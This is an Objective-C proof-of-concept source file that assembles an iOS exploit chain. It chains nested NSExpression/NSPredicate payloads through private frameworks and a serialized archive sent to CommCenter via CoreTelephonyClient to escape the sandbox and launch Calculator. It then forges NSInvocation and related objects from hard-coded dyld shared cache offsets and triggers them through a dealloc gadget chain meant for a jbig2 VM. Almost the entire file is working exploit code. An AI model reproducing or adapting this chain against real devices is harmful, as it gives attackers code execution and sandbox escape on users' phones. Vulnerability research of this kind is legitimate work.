//
//  clazz.m
//  poc-app
//
//  Created by Jeffrey Hofmann on 2/28/23.
//

#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <Foundation/NSObjCRuntime.h>
#import <objc/runtime.h>

#import <mach-o/dyld.h>
#import "clazz.h"

#import <malloc/malloc.h>
#include <dlfcn.h>

#include <os/lock.h>

@implementation Clazz

+(void)go{
    @autoreleasepool {
        // full payload creation
        jbig2VmBuildFullNSInvocationFakeObjectWithPopCalcSbxChain();
    }
}

-(void)hello{
    @autoreleasepool {
        NSLog(@"Hello Invoked");
    }
}

NSString* wrapStringInConcatFunctions(NSString *s){
    // A string literal of > 2048 characters will cause NSExpression parsing to fail
    // So we split the string into chunks
    NSInteger chunkSize = 2048;
    NSInteger length = [s length];
    NSString *concatLargeStringPayload = @"FUNCTION('','stringByAppendingString:',%@)";
    for (NSInteger i = 0; i < length; i += chunkSize) {
        NSRange range = NSMakeRange(i, MIN(length - i, chunkSize));
        NSString *chunk = [s substringWithRange:range];
        NSString *concatChunk =  [NSString stringWithFormat:@"FUNCTION('%@','stringByAppendingString:',", chunk];
        concatChunk = [concatChunk stringByAppendingString:@"%@)"];
        concatLargeStringPayload = [NSString stringWithFormat:concatLargeStringPayload, concatChunk];
        //[base64StringArray appendString:@"','"];
        //[stringChunks addObject:chunk];
    }
    return [NSString stringWithFormat:concatLargeStringPayload, @"''"];
}


NSArray* buildDeserializationPayloadFromNSString(NSString *stringPayload){
        NSExpression *exprPayload = [NSExpression expressionWithFormat:stringPayload];
        NSPredicate *predPayload = [NSPredicate predicateWithFormat:@"'pwned' like %@", exprPayload];

        AVSpeechSynthesisVoice *voice = [AVSpeechSynthesisVoice voiceWithLanguage:@"en-GB"];
        // allocation above should have loaded in PrototypeTools.framework
        // attempt to force this load anyway. This is really just a living example of how to do this
        // https://www.swiftjectivec.com/calling-private-ios-apis-using-nsinvocation/
        // https://developer.limneos.net/?ios=14.4&framework=PrototypeTools.framework&header=PTSection.h
        [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/PrototypeTools.framework"] load];
        // now we need to create the prototype objects

        #pragma clang diagnostic push
        #pragma clang diagnostic ignored "-Wundeclared-selector"
        SEL setConditionSel = @selector(setCondition:);

        // [NSArray arrayWithObjects:[[[PTRow alloc] init] setCondition:nsPredString]]
        // create the PTRow
        id instPTRow = [[NSClassFromString(@"PTRow") alloc] init];
        // invoke setCondition with our NSExpression payload
        NSInvocation *setConditionInvocation = [NSInvocation invocationWithMethodSignature:[instPTRow methodSignatureForSelector:setConditionSel]];
        [setConditionInvocation setSelector:setConditionSel];
        [setConditionInvocation setTarget:instPTRow];
        [setConditionInvocation setArgument:&predPayload atIndex:2];
        [setConditionInvocation invoke];

        
        NSArray *rows =  [NSArray arrayWithObjects: instPTRow, nil];
        // create the PTSection
        id instPTSection = [[NSClassFromString(@"PTSection") alloc] init];
        Ivar rowsIVar = class_getInstanceVariable([instPTSection class], "_rows");
        // _rows is a private instance variable. Rather than figuring out the correct way
        // to call initWithRows or something similar, just modify the instance variable directly
        // super hacky, but so is referencing private structures
        // http://jerrymarino.com/2014/01/31/objective-c-private-instance-variable-access.html
        object_setIvar(instPTSection, rowsIVar, rows);
        
        
         NSArray *deallocPayload =  [NSArray arrayWithObjects:
            voice,
            instPTSection,
        nil];
        
        return deallocPayload;
}

static void jbig2VmBuildFullNSInvocationFakeObjectWithPopCalcSbxChain() {
    @autoreleasepool {
        // Load the frameworks necessary to assemble our payload
        [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/PrototypeTools.framework"] load];
        [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/CalendarFoundation.framework"] load];
        
        // [FBSOpenApplicationService openApplication:'com.apple.calculator' withOptions:nil completion:nil]
        NSString *popCalcPayload  = @"FUNCTION(CAST('FBSOpenApplicationService','Class'), 'alloc')"; // FSB is Frontboard, related to Springboard
        popCalcPayload =  [NSString stringWithFormat:@"FUNCTION(%@,'init')", popCalcPayload];
        popCalcPayload =  [NSString stringWithFormat:@"FUNCTION(%@,'openApplication:withOptions:completion:','com.apple.calculator',NIL, NIL)", popCalcPayload];
        
        // create an NSExpression payload
        NSString *payloadNSExpression = [NSString stringWithFormat:@"FUNCTION(CAST('NSExpression', 'Class'), 'expressionWithFormat:', \"%@\")", popCalcPayload];
        
        /*
        While writing this, I noticed that some NSExpression calls seemed to return duplicates of their first object. As an example:

        expr [[NSExpression expressionWithFormat:@"FUNCTION(CAST('NSDictionary', 'Class'), 'dictionaryWithObjectsAndKeys:', 'b', 'c', 'a', NIL)"] expressionValueWithObject:nil context:nil];
        (__NSDictionaryI *) $4 = 0x0000000283848e80 2 key/value pairs
        (lldb) po 0x0000000283848e80
        {
         a = c;
         b = b;
        }
        This should have thrown an error, as dictionaryWithObjectsAndKeys: expects a (value, key) pairing, but b is seen twice. No idea why!
        This was problematic for creating a predicate with a format string, so we use a dictionary wrapper
        with predicateWithSubstitutionVariables:
        */
        
        NSString *dictWrapper = [NSString stringWithFormat:@"FUNCTION(CAST('NSDictionary', 'Class'), 'dictionaryWithObjectsAndKeys:', 'duplicated', %@, 'payload', NIL)", payloadNSExpression];
        // Create our NSPredicate and store it for later assignment to PTRow->condition
        NSString *storeNSPredicatePayload = [NSString stringWithFormat:@"FUNCTION(FUNCTION(CAST('NSPredicate', 'Class'), 'predicateWithFormat:argumentArray:', '\"pwned\" like $payload', NIL), 'predicateWithSubstitutionVariables:', %@)", dictWrapper];
        // Store it using [CaliCalendarAnonymizer sharedAnonymizedStrings] as a local variable store
        storeNSPredicatePayload = [NSString stringWithFormat:@"FUNCTION(FUNCTION(CAST('CaliCalendarAnonymizer','Class'),'sharedAnonymizedStrings'), 'setObject:forKey:',%@, 'NSPredicate')", storeNSPredicatePayload];
  
        // Create and store a reference to a PTRow
        NSString *createAndStorePTRow = @"FUNCTION(CAST('PTRow','Class'),'alloc')";
        createAndStorePTRow = [NSString stringWithFormat:@"FUNCTION(%@,'init')", createAndStorePTRow];
        createAndStorePTRow = [NSString stringWithFormat:@"FUNCTION(FUNCTION(CAST('CaliCalendarAnonymizer','Class'),'sharedAnonymizedStrings'), 'setObject:forKey:',%@, 'PTRow')", createAndStorePTRow];
        
        // Create a PTSection with no rows. The _rows variable will be assigned later without calling one of PTSection's methods
        // so as to prevent executing the NSPredicate early (in IMTranscoderAgent)
        NSString *initSectionWithNoRows = @"FUNCTION(FUNCTION(CAST('PTSection','Class'),'alloc'), 'init')";
        initSectionWithNoRows = [NSString stringWithFormat:@"FUNCTION(FUNCTION(CAST('CaliCalendarAnonymizer','Class'),'sharedAnonymizedStrings'), 'setObject:forKey:',%@, 'PTSection')", initSectionWithNoRows];
    
        // Arm the PTRow by assigning PTRow->condition to our NSPredicate payload
        NSString *getNSPredicatePayload = @"FUNCTION(FUNCTION(CAST('CaliCalendarAnonymizer','Class'),'sharedAnonymizedStrings'), 'objectForKey:', 'NSPredicate')";
        NSString *armPTRow = @"FUNCTION(FUNCTION(CAST('CaliCalendarAnonymizer','Class'),'sharedAnonymizedStrings'), 'objectForKey:', 'PTRow')";
        armPTRow = [NSString stringWithFormat:@"FUNCTION(%@, 'setValue:forKey:', %@, 'condition')", armPTRow, getNSPredicatePayload];
        
        // Create an NSArray containing the payload predicate
        NSString *createRowsArray = @"FUNCTION(FUNCTION(CAST('CaliCalendarAnonymizer','Class'),'sharedAnonymizedStrings'), 'objectForKey:', 'PTRow')";
        createRowsArray = [NSString stringWithFormat:@"FUNCTION(CAST('NSArray','Class'),'arrayWithObjects:',%@, NIL)", createRowsArray];
        createRowsArray = [NSString stringWithFormat:@"FUNCTION(FUNCTION(CAST('CaliCalendarAnonymizer','Class'),'sharedAnonymizedStrings'), 'setObject:forKey:',%@, 'PTRowsArray')", createRowsArray];
        
        // Arm the PTSection by assigning the NSArray containing our armed PTRow to PTSection->_rows
        //  using NSObject's setValue:forKey: selector preventing early execution of the predicate
        NSString *armPTSection = @"FUNCTION(FUNCTION(CAST('CaliCalendarAnonymizer','Class'),'sharedAnonymizedStrings'), 'objectForKey:', 'PTSection')";
        NSString *getPTRowsArray = @"FUNCTION(FUNCTION(CAST('CaliCalendarAnonymizer','Class'),'sharedAnonymizedStrings'), 'objectForKey:', 'PTRowsArray')";
        armPTSection = [NSString stringWithFormat:@"FUNCTION(%@, 'setValue:forKey:', %@, '_rows')", armPTSection, getPTRowsArray];
        
        // Wrap our armed PTSection in an array containing an AVSpeechSynthesisVoice, which will force the loading
        // of PrototypeTools.framework in CommCenter
        NSString *nsArrayCommcenterDeserializeObject = @"FUNCTION(CAST('NSArray','Class'),'arrayWithObjects:', FUNCTION(CAST('AVSpeechSynthesisVoice', 'Class'), 'voiceWithLanguage:', 'en-GB') , FUNCTION(FUNCTION(CAST('CaliCalendarAnonymizer','Class'),'sharedAnonymizedStrings'), 'objectForKey:', 'PTSection'), NIL)";
        
        // Allocate a CoreTelephonyClient and send our payload
        NSString *sendCalcToCommCenterPayload  = @"FUNCTION(CAST('CoreTelephonyClient','Class'), 'alloc')";
        sendCalcToCommCenterPayload = [NSString stringWithFormat:@"FUNCTION(%@,'init')", sendCalcToCommCenterPayload];
        sendCalcToCommCenterPayload =  [NSString stringWithFormat:@"FUNCTION(%@,'context:evaluateMobileSubscriberIdentity:',NIL, %@)", sendCalcToCommCenterPayload, nsArrayCommcenterDeserializeObject];
                              
        /*
         The following essentially does this with NSExpresssions:
            NSArray *expressionsArray = @[
                [NSExpression expressionWithFormat:storeNSPredicatePayload],
                [NSExpression expressionWithFormat:createAndStorePTRow],
                [NSExpression expressionWithFormat:initSectionWithNoRows],
                [NSExpression expressionWithFormat:armPTRow],
                [NSExpression expressionWithFormat:createRowsArray],
                [NSExpression expressionWithFormat:armPTSection],
                [NSExpression expressionWithFormat:sendCalcToCommCenterPayload]
            ];
        */
        NSString *base64DecodeString = @"FUNCTION(FUNCTION(CAST('NSString','Class'),'alloc'),'initWithData:encoding:',FUNCTION(FUNCTION(CAST('NSData','Class'), 'alloc'),'initWithBase64EncodedString:options:',%@,NIL),FUNCTION(4,'intValue'))";
        NSString *createAndRunSequentialNSExpressionArray = [NSString stringWithFormat:@"FUNCTION(CAST('NSArray','Class'),'arrayWithObjects:',%@,%@,%@,%@, NIL)",
             // Lots going on here. In order to handle all string escaping (""), we base64 encode our predicates.
             //     [storeNSPredicatePayload dataUsingEncoding:NSUTF8StringEncoding] base64EncodedStringWithOptions:0]
             // We then wrap this string in concatenation functions, as a single string defined in an NSExpression
             // can only be 0x1000 characters long.
             //     wrapStringInConcatFunctions(...)
             // We then init an NSData class with the full base64 string, base64 decode the NSData
             // and finally init an NSString with the decoded NSData
             //     base64DecodeString
             // The inner NSExpression evaluation triggers concatenation and decoding, then creates a new NSExpression from the output
             [NSString stringWithFormat:@"FUNCTION(CAST('NSExpression', 'Class'), 'expressionWithFormat:', FUNCTION(FUNCTION(CAST('NSExpression', 'Class'), 'expressionWithFormat:', \"%@\"), 'expressionValueWithObject:context:', NIL, NIL))",
                 [NSString stringWithFormat:base64DecodeString,
                  wrapStringInConcatFunctions([[storeNSPredicatePayload dataUsingEncoding:NSUTF8StringEncoding] base64EncodedStringWithOptions:0])]],
                                                             
             [NSString stringWithFormat:@"FUNCTION(CAST('NSExpression', 'Class'), 'expressionWithFormat:', \"%@\")", createAndStorePTRow],

             [NSString stringWithFormat:@"FUNCTION(CAST('NSExpression', 'Class'), 'expressionWithFormat:', \"%@\")", initSectionWithNoRows],

             [NSString stringWithFormat:@"FUNCTION(CAST('NSExpression', 'Class'), 'expressionWithFormat:', \"%@\")", armPTRow]
         ];
        
        // https://github.com/mapbox/mapbox-gl-native/issues/11541
        // https://stackoverflow.com/questions/18115237/swizzling-a-method-with-variable-arguments-and-forward-the-message-bad-access/18116108#18116108
        // passing 4 or more arguments to a variadic function seems to cause a crash, so we create an NSArray of length 4 and
        // add every other item individually with [newArray arrayByAddingObject:newObject];
        createAndRunSequentialNSExpressionArray = [NSString
             stringWithFormat:@"FUNCTION(%@, 'arrayByAddingObject:', %@)", createAndRunSequentialNSExpressionArray,
            [NSString stringWithFormat:@"FUNCTION(CAST('NSExpression', 'Class'), 'expressionWithFormat:', \"%@\")", createRowsArray]
        ];

        createAndRunSequentialNSExpressionArray = [NSString
             stringWithFormat:@"FUNCTION(%@, 'arrayByAddingObject:', %@)", createAndRunSequentialNSExpressionArray,
            [NSString stringWithFormat:@"FUNCTION(CAST('NSExpression', 'Class'), 'expressionWithFormat:', \"%@\")", armPTSection]
        ];

        createAndRunSequentialNSExpressionArray = [NSString
             stringWithFormat:@"FUNCTION(%@, 'arrayByAddingObject:', %@)", createAndRunSequentialNSExpressionArray,
            [NSString stringWithFormat:@"FUNCTION(CAST('NSExpression', 'Class'), 'expressionWithFormat:', \"%@\")", sendCalcToCommCenterPayload]
        ];

        // one final trick to instantiate a selector via reflection, as string->selector conversion only happens for the first arg!
        NSString *selectorReflection = @"FUNCTION(FUNCTION(FUNCTION(CAST('NSFunctionExpression','Class'),'alloc'),'initWithTarget:selectorName:arguments:','','expressionValueWithObject:context:',{}),'selector')";
        createAndRunSequentialNSExpressionArray = [
            NSString stringWithFormat:@"FUNCTION(FUNCTION(CAST('NSArray','Class'), 'arrayWithArray:',%@), 'makeObjectsPerformSelector:',%@)",
            createAndRunSequentialNSExpressionArray, selectorReflection
        ];
        
        // This pops calculator
        //[[NSExpression expressionWithFormat:createAndRunSequentialNSExpressionArray] expressionValueWithObject:nil context:nil];
        
        
        // Compress the payload
        NSString *compressedExprStringB64String = [[[createAndRunSequentialNSExpressionArray dataUsingEncoding:NSUTF8StringEncoding] compressedDataUsingAlgorithm:NSDataCompressionAlgorithmLZMA error:nil] base64EncodedStringWithOptions:0];
        NSString *lzmaDecompressString = @"FUNCTION(FUNCTION(CAST('NSString','Class'),'alloc'),'initWithData:encoding:',FUNCTION(FUNCTION(FUNCTION(CAST('NSData','Class'), 'alloc'),'initWithBase64EncodedString:options:','%@', FUNCTION('4','intValue')),'decompressedDataUsingAlgorithm:error:',FUNCTION('2','intValue'),NIL), FUNCTION(4,'intValue'))";
        NSString *fullDecompressionPayload = [NSString stringWithFormat:@"FUNCTION(FUNCTION(CAST('NSExpression', 'Class'), 'expressionWithFormat:', FUNCTION(FUNCTION(CAST('NSExpression', 'Class'), 'expressionWithFormat:', \"%@\"), 'expressionValueWithObject:context:', NIL, NIL)), 'expressionValueWithObject:context:', NIL, NIL)",
            [NSString stringWithFormat:lzmaDecompressString,
             compressedExprStringB64String]]; // smaller than 2048 bytes so don't need to concatenate the string
        NSLog(@"length of final payload: %d", [fullDecompressionPayload length]); // length of final payload: 2022

        // At this point, createAndRunSequentialNSExpressionArray is fully assembled, now trigger it with our dealloc gadget
        
        // this pops calc
        //NSExpression *ttt = [[NSExpression expressionWithFormat:fullDecompressionPayload] expressionValueWithObject:nil context:nil];
        NSError *error = nil;
        NSArray *initialExecutionNSArray = buildDeserializationPayloadFromNSString(fullDecompressionPayload);
        NSData *initialExecutionArchive = [NSKeyedArchiver archivedDataWithRootObject:initialExecutionNSArray requiringSecureCoding:NO error:&error];
        // this will trigger execution of createAndRunSequentialNSExpressionArray
        //[NSKeyedUnarchiver unarchiveObjectWithData:initialExecutionArchive];
        // write this payload to the iphone's disk to retrieve for later use
        

        // serialize the payload to disk for easy copying
        //NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"serializedFullPayload"];
        [initialExecutionArchive writeToFile:@"/tmp/initialExecutionArchive" options:NSDataWritingAtomic error:&error];
        // -----------------------------------------------------------
        // Demonstrate triggering this unarchiving with all fake objects after leaking the base of DYLD_SHARED_CACHE
        // DYLD_SHARED_CACHE offets
        // DYLD_CACHE_HEADER (base) = 0x180000000
        // calculate base address dynamically
        // 0x1D8EC7480 _OBJC_METACLASS_$_NSInvocation is 0x58EC7480 from the base
        // the base will be calculated differently with the jbig2 vm, but all offset calculations will be the same
        Class NSInvocationClass = object_getClass([NSInvocation alloc]);
        unsigned long long NSInvocationClassAddr = (unsigned long long)NSInvocationClass;
        unsigned long long NSInvocationClassAddrOffsetFromDyldBase = 0x58EC7458;
        unsigned long long dyld_shared_cache_base = NSInvocationClassAddr - NSInvocationClassAddrOffsetFromDyldBase;
        NSLog(@"\"leaked\" dyld base address: 0x%llx", dyld_shared_cache_base);
        unsigned long long static_dyld_shared_cache_base = 0x180000000;
        
        // necessary addresses to build the fake objects, Class ptrs and magic ptr
        // must be dereffed by the jbig2 VM
        unsigned long long calculated_magic_cookie_addr = 0x1D8ECDB30ULL - static_dyld_shared_cache_base + dyld_shared_cache_base;
        unsigned long long calculated_NSInvocationClass_addr = 0x1D8EC7458ULL - static_dyld_shared_cache_base + dyld_shared_cache_base;
        unsigned long long calculated_NSConcreteMutableDataClass_addr = 0x1D8ECF300ULL - static_dyld_shared_cache_base + dyld_shared_cache_base;
        unsigned long long calculated_NSKeyedUnarchiverClass_addr = 0x1D8ED0C28ULL - static_dyld_shared_cache_base + dyld_shared_cache_base;
        unsigned long long calculated_sel_unarchiveObjectWithData_addr = 0x1CB0027D8ULL - static_dyld_shared_cache_base + dyld_shared_cache_base;
        unsigned long long calculated_NSMethodSignatureClass_addr = 0x1D8EC73B8ULL - static_dyld_shared_cache_base + dyld_shared_cache_base;
        unsigned long long calculated_LSProgressNotificationTimerClass_addr = 0x1D951D358ULL - static_dyld_shared_cache_base + dyld_shared_cache_base;
        unsigned long long calculated__UIViewServiceTextEffectsOperatorClass_addr = 0x1D8F272C0ULL - static_dyld_shared_cache_base + dyld_shared_cache_base;

        
        // Sizes of fake objects
        unsigned long long NSInvocation_size = 0x38;
        unsigned long long NSConcreteMutableData_size = 0x28;
        unsigned long long LSProgressNotificationTimer_size = 0x40;
        unsigned long long _UIViewServiceTextEffectsOperator_size = 0x880;
        
        // NSConcreteMutableData offsets
        uint _lengthOffset = 0x10;
        uint _capacityOffset = 0x18;
        uint _bytesOffset = 0x20;
        
        
        // NSInvocation offsets
        uint _frameOffset = 0x8;
        uint _signatureOffset = 0x18;
        uint _magicOffset = 0x30;
        
        // LSProgressNotificationTimer offsets
        uint _timerOffset = 0x10;
        
        // _UIViewServiceTextEffectsOperator offsets
        uint _invalidationInvocationOffset = 0x28;
        
        unsigned long long tmp = 0; // tmp variable used to write ints
        /*
         frame variable *archive
         (NSConcreteMutableData) *archive = {
           NSMutableData = {
             NSData = {
               NSObject = {
                 isa = NSConcreteMutableData
               }
             }
           }
           _length = 3671                   0x10
           _capacity = 5506                 0x18
           _bytes = 0x0000000101825a00      0x20
         
         expr class_getInstanceSize(NSClassFromString(@"NSConcreteMutableData"))
         (size_t) $1 = 40
        */
        
        void *rawFakeNSConcreteMutableDataPtr = malloc(NSConcreteMutableData_size);
        // zero out struct
        memset(rawFakeNSConcreteMutableDataPtr, 0, NSConcreteMutableData_size);
        
        memcpy(rawFakeNSConcreteMutableDataPtr, &calculated_NSConcreteMutableDataClass_addr, 8);
        tmp = [initialExecutionArchive length];
        memcpy(rawFakeNSConcreteMutableDataPtr + _lengthOffset, &tmp, 8);
        memcpy(rawFakeNSConcreteMutableDataPtr + _capacityOffset, &tmp, 8);
        tmp = [initialExecutionArchive bytes];
        memcpy(rawFakeNSConcreteMutableDataPtr + _bytesOffset, &tmp, 8);
        
        
        // NSInvocation *fakeInvocation = [NSInvocation alloc];
        /*
         (NSInvocation) *fakeInvocation = {
           NSObject = {
             isa = NSInvocation                 0x0
           }
           _frame = 0x0000000000000000          0x8
           _retdata = 0x0000000000000000
           _signature = nil                     0x18
           _container = nil
           _replacedByPointerBacking = 0x0000000000000000
           _magic = 0                           0x30
           _retainedArgs = '\0'
           _stackAllocated = '\0'
         }
        
         offset calculations command:
         (lldb) p (uintptr_t)&((NSInvocation *)0)->_frame
         (uintptr_t) $11 = 8
         */
        
        
        void *rawFakeInvocationPtr = malloc(NSInvocation_size);
        // zero out struct
        memset(rawFakeInvocationPtr, 0, NSInvocation_size);
        
        
        // fake an internal _frame variable
        void *_frame = malloc(0x18);
        memcpy(_frame, &calculated_NSKeyedUnarchiverClass_addr, 8); // target object, faked NSExpresion
        memcpy(_frame + 8, &calculated_sel_unarchiveObjectWithData_addr, 8); // selector, expressionValueWithObject:context:
        memcpy(_frame + 0x10, &rawFakeNSConcreteMutableDataPtr, 8); // NSConcreteMutableData*
        // rawFakeNSConcreteMutableDataPtr
        // fake an NSMethodSignature object
        void *_signature = malloc(0x18);
        void *frame_head = malloc(0x18);
        void *first_frame_elem;
        void *frame_ret_value;
        
        
        // zero out structs
        memset(_signature, 0, 0x18);
        memset(frame_head, 0, 0x18);
        
        void* (^make_frame_descriptor_list)(int) = ^(int num_args)
        {
            void *last = 0x0;
            for(long long i = num_args - 1; i >= 0 ; i--) {
                void* elem = malloc(0x28);
                memset(elem, 0, 0x28);
                memcpy(elem + 0x8, &last, 8); // next element
                unsigned long long tmp = 8;//
                memcpy(elem + 0x10, &tmp, 8); // memory offset and size
                tmp = (i*8) << 32 | 0x8;
                memcpy(elem + 0x18, &tmp, 8); // frame offset and size
                tmp = 0x0000515100000000;
                memcpy(elem + 0x20, &tmp, 8); // flags
                last = elem;
            }
            return last;
        };
        
        frame_ret_value = make_frame_descriptor_list(1);
        first_frame_elem = make_frame_descriptor_list(3); // 3 args: obj, sel, unarchiveObjectWithData:archive
        
        memcpy(frame_head, &frame_ret_value, 8);
        memcpy(frame_head + 8, &first_frame_elem, 8);
        tmp = 0x000000e000000003; // frame size + num args (3)
        memcpy(frame_head + 0x10, &tmp, 8);
        
        // classptr | 0x1 | 0x0010000000000000 creates class ptr with non 0 ref count
        // isn't actually necessary
        tmp = (unsigned long long)calculated_NSMethodSignatureClass_addr;// | 0x1 | 0x0010000000000000;
        memcpy(_signature, &tmp, 8);
        memcpy(_signature + 8, &frame_head, 8);
        
        // set isa pointer to NSInvocation
        memcpy(rawFakeInvocationPtr, &calculated_NSInvocationClass_addr, 8);
        // populate magic value
        memcpy(rawFakeInvocationPtr + _magicOffset, calculated_magic_cookie_addr, 8);
        // populate frame value
        memcpy(rawFakeInvocationPtr + _frameOffset, &_frame, 8);
        // populate signature value
        memcpy(rawFakeInvocationPtr + _signatureOffset, &_signature, 8);
        
        // at this point, the NSInvocation has been built entirely from a leaked address.
        // the following line would successfully trigger an invocation, but the real payload must use
        // an object chain to trigger an invoke from a dealloc
        //[fakeInvocation invoke];

        /*
         -[LSProgressNotificationTimer dealloc]    CoreServices:__text    0x180751004
         
         void __cdecl -[LSProgressNotificationTimer dealloc](LSProgressNotificationTimer *self, SEL a2)
         {
           objc_super v3; // [xsp+0h] [xbp-20h] BYREF

           -[NSTimer invalidate](self->_timer, "invalidate");
           v3.receiver = self;
           v3.super_class = (Class)&OBJC_CLASS___LSProgressNotificationTimer;
           -[NSObject dealloc](&v3, "dealloc");
         }
         
         Calls:
         
         -[_UIViewServiceTextEffectsOperator invalidate]    UIKitCore:__text    0x1830BE96C
         id __cdecl -[_UIViewServiceTextEffectsOperator invalidate](_UIViewServiceTextEffectsOperator *self, SEL a2)
         {
           return -[_UIAsyncInvocation invoke](self->_invalidationInvocation, "invoke");
         }
 
        [LSProgressNotificationTimer dealloc]
          [LSProgressNotificationTimer->_timer invalidate]
           becomes
          [_UIViewServiceTextEffectsOperator invalidate]
              [_UIViewServiceTextEffectsOperator->_invalidationInvocation invoke]
               becomes
              [faked NSInvocation invoke]

         
         */
        // build object chain to trigger invoke from dealloc
        // both of these are naturally loaded in IMTranscoderAgent, and are necessary for the
        // dealloc -> invoke primitive
        [[NSBundle bundleWithPath:@"/System/Library/Frameworks/CoreServices.framework"] load];
        [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/UIKitCore.framework"] load];
  
        void *rawLSProgressNotificationTimerPtr = malloc(LSProgressNotificationTimer_size);
        id fakeLSProgressNotificationTimer = rawLSProgressNotificationTimerPtr;
        void *raw_UIViewServiceTextEffectsOperatorPtr = malloc(_UIViewServiceTextEffectsOperator_size);
        
        // zero out structs
        memset(rawLSProgressNotificationTimerPtr, 0, LSProgressNotificationTimer_size);
        memset(raw_UIViewServiceTextEffectsOperatorPtr, 0, _UIViewServiceTextEffectsOperator_size);
        
        memcpy(rawLSProgressNotificationTimerPtr, &calculated_LSProgressNotificationTimerClass_addr, 8);
        memcpy(rawLSProgressNotificationTimerPtr + _timerOffset, &raw_UIViewServiceTextEffectsOperatorPtr, 8);
        
        memcpy(raw_UIViewServiceTextEffectsOperatorPtr, &calculated__UIViewServiceTextEffectsOperatorClass_addr, 8);
        memcpy(raw_UIViewServiceTextEffectsOperatorPtr + _invalidationInvocationOffset, &rawFakeInvocationPtr, 8);
        
      
        // trigger the full chain of faked objects resulting in an [NSInvocation invoke]
        [fakeLSProgressNotificationTimer dealloc];
        // this is fully portable to the jbig2 VM!
        // the payload will need to deserialize and evaluate an NSFunctionExpression, so that we
        // don't also need to fake that. Because prototype tools are also loaded, we can use the same
        // sandbox escape gadget to do this with one [NSKeyedUnarchiver unarchiveObjectWithData:archive] call,
        // where archive is a faked NSdata obj.
    }
}

@end
